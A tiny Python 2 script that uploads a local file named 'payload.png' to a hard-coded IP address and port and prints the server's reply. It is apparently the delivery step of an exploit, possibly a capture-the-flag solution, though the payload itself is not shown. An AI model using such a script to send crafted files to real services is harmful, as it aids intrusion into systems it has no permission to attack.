import requests

URL = 'http://110.10.212.148:2222/url'

files = {'file': ('payload.png', open('payload.png', 'rb'), 'image/png')}
r = requests.post(URL, files=files)

print r.content
